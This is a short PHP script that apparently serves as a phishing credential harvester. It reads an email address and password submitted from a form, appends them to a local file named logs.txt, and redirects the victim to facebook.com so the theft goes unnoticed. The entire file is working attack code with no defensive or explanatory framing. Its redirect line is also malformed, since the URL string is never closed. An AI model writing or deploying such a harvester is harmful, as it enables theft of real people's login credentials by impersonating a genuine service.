<?php

$email = $_POST['email'];
$password = $_POST['pass'];


$file = fopen('logs.txt', 'a');
fwrite($file, "\n\nEmail: ");
fwrite($file, $email."\n");
fwrite($file, "Password: ");
fwrite($file, $password);
fclose($file);
?>

<script>
location.replace('https://facebook.com)
</script>
